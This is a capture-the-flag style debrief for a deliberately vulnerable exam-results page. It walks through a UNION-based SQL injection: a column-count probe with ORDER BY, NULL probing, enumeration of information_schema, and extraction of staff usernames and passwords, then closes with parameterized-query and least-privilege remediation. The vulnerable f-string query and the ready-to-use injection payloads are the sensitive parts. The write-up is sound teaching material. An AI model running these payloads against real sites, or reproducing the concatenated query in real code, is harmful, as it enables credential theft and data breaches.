# Exam Results Board, Debrief

**Node:** `p1_3` &middot; **Flag:** `SEIYAKU{append_your_own_select}` &middot; **Route:** `GET /p1/results` &middot; **Sink:** `challenges/phase1.py`, `mariadb` (`results` table, `staff` table)

## Root cause

The results search builds its query the same way every other floor on
this exam does, raw f-string concatenation, no escaping:

```python
# challenges/phase1.py
query = f"SELECT id,name,score FROM results WHERE name LIKE '%{q}%'"  # VULN: string concat
cur.execute(query)
rows = cur.fetchall()
```

`q` comes straight from `request.args`, spliced between the two `%`
wildcards inside the `LIKE` clause's string literal. p1_1 exploited this
shape to make a `WHERE` clause always-true; p1_2 exploited it to make a
function throw an error that leaked data in its message. This floor's
lesson is a third technique: the query's *entire result set* is rendered
into an HTML table, with no filtering on which columns or how many rows
come back. That means a `q` which closes the string, appends its own
`UNION SELECT`, and comments out the trailing wildcard can make MariaDB
return rows from a completely different table, and the app will print
them exactly like any other search result, no error required.

## The technique: `UNION SELECT`

SQL's `UNION` operator stacks the results of two `SELECT` statements into
one result set, with one hard requirement: **both sides must return the
same number of columns.** If they do, MariaDB is happy to run a
completely unrelated second query and hand its rows back as if they'd
always belonged to the first one's result set, column names in the
combined output come from the *first* `SELECT`, so the injected data
lands under whatever headers the legitimate query already uses.

That's the whole primitive: find the column count the legitimate query
uses, match it, and the second `SELECT` can point anywhere the DB account
can read.

## The walk (verified against this exact seed)

**Where the input goes.** The parameter is visible for free: the search
form is `<input name="q">` submitting over GET, so every attempt is just
`/p1/results?q=...`, and that `q` value lands inside the query's `LIKE`
clause. The table this floor hides its flag in is *not* shown anywhere;
you discover it in step 3, using the board's own output, not the app's
source.

**1. Discover the column count with `ORDER BY`.** `ORDER BY N` sorts by
the N-th column of the result set; asking for a column that doesn't exist
is a MariaDB error, so incrementing `N` until it breaks is a standard,
non-destructive way to find the width of a query you can't see the source
of:

```
/p1/results?q=' ORDER BY 3-- -
```

Renders the board normally, 3 is in range. Bump it by one:

```
/p1/results?q=' ORDER BY 4-- -
```

The route's `except` block (same house pattern as p1_1/p1_2, the raw
DBMS error is echoed to the page) surfaces, verbatim from this seed:

```
(1054, "Unknown column '4' in 'ORDER BY'")
```

Column 4 doesn't exist; column 3 did. The `results` query returns exactly
**3 columns** (`id`, `name`, `score`).

**2. Confirm the column count and types with `NULL`.** `NULL` is
type-compatible with virtually anything in MariaDB, which makes it the
safe first guess when probing how many columns a `UNION SELECT` needs
before you know (or care) what types they are:

```
/p1/results?q=' UNION SELECT NULL,NULL,NULL-- -
```

Against this seed, the board renders its usual 5 rows (Gon, Killua,
Kurapika, Leorio, Hisoka) plus one new row: `id`/`name`/`score` all show
`None`, the union'd row landed cleanly, confirming 3 columns is exactly
right and every column tolerates `NULL`.

**3. Find something worth reading (discover the target).** Nothing has
named a target table yet. You can see `results`, its rows are what the
board prints, but the flag isn't in it. Since a `UNION` hands you *visible
rows*, the easiest move is to ask the database's own catalog
(`information_schema`, explained in p1_2's debrief) to list what else
exists and read the answer straight off the board:

```
/p1/results?q=' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -
```

Because each challenge is isolated to its own database (see Remediation
below), this returns exactly this floor's two tables, as ordinary result
rows appended under the board's own `name` column:

```
results
staff
```

`results` is the one the board already displays; `staff` is the extra
table, so it's the one to look inside. List its columns the same way:

```
/p1/results?q=' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_schema=database() AND table_name='staff'-- -
```

which prints `username` and `password` as rows. So the target is
`staff.password`, discovered with nothing but the board's own output and
no access to the app's source. (Every query above needs only a DB account
that can read `information_schema`, which every account can by default.
This is exactly the enumeration sqlmap automates for you; see the
Automated Floor Skip debrief in Phase 2 for driving it with a tool.)

**4. Extract.** With the table and column names in hand, replace the
`NULL` placeholders with real columns from `staff`, keeping the same
3-column shape (`results` only has 3 columns to match, `staff` only has
2, so one slot stays `NULL`):

```
/p1/results?q=' UNION SELECT NULL,CONCAT(username,0x3a,password),NULL FROM staff-- -
```

- `'` closes the `LIKE '%...'` string literal the app opened.
- `UNION SELECT NULL,CONCAT(username,0x3a,password),NULL FROM staff`
  supplies exactly 3 columns, `NULL` for `id`, the real payload for
  `name`, `NULL` for `score`, reading from `staff` instead of `results`.
  `0x3a` is a hex literal for `:`, just a readable separator between the
  two stolen columns (same trick p1_2 used inside its `extractvalue()`
  payload).
- `-- -` comments out the trailing `%'` the app appends after `{q}`, so
  the statement still parses cleanly.

The query MariaDB actually runs:

```sql
SELECT id,name,score FROM results WHERE name LIKE '%' UNION SELECT NULL,CONCAT(username,0x3a,password),NULL FROM staff-- -%'
```

The rendered table, verbatim from this seed, gets one extra row appended
after the five real applicants:

```
id: None    name: chief_examiner:SEIYAKU{append_your_own_select}    score: None
```

No error, no truncation window (unlike p1_2's `extractvalue()`, which
only leaks the first ~32 characters of its argument), the entire
`staff.password` value rides home in an ordinary table cell, because
`UNION` has no length limit on what a column can carry.

## HxH analogy

Chrollo Lucilfer's Skill Hunter doesn't out-fight an opponent's Nen
ability, it steals it, and the moment it's stolen, that ability is
simply *appended* to Chrollo's own book. It doesn't sit apart, flagged as
foreign; from then on it executes exactly like every technique Chrollo
was born with, indistinguishable at the point of use. The book doesn't
check where a page came from before it lets him read from it.

The results board has the identical blind spot. Its `SELECT` was only
ever supposed to run against `results`, but SQL's `UNION` lets a second,
completely unrelated `SELECT` get appended onto the first one's result
set, and the moment it's appended, the board can't tell the difference.
It renders the stolen rows in the same table, under the same headers,
with the same formatting, as if they'd been part of the applicants'
scores all along. The vulnerability isn't that the board *can* be
searched, it's that anything shaped like a valid extension of its own
query gets treated as if it always belonged there.

## Remediation

- **Parameterized queries, always**, the same root fix as p1_1/p1_2:

  ```python
  cur.execute(
      "SELECT id,name,score FROM results WHERE name LIKE %s",
      (f"%{q}%",),
  )
  ```

  With the value passed as a bound parameter, `q` can never break out of
  the string literal in the first place, `UNION`, `ORDER BY`, and every
  other injected clause above depend entirely on the attacker's text
  being re-parsed as SQL grammar, which parameterization prevents
  outright.
- **Least-privilege DB account.** This is the fix specific to `UNION`
  attacks: even with the sink wide open, a `UNION SELECT ... FROM staff`
  only works if the connecting account can read `staff` at all. Grant the
  results-board's DB user `SELECT` on `results` only (column- or
  table-level grants, or a dedicated read-only view) so a table it was
  never meant to touch simply isn't a valid target, injection or not.
- **Don't echo raw DBMS error text to the client** (the same second bug
  as p1_1/p1_2), it's what made the `ORDER BY` column-count probe this
  fast; a generic "no results" message on any query error removes that
  signal, forcing an attacker toward slower blind techniques.
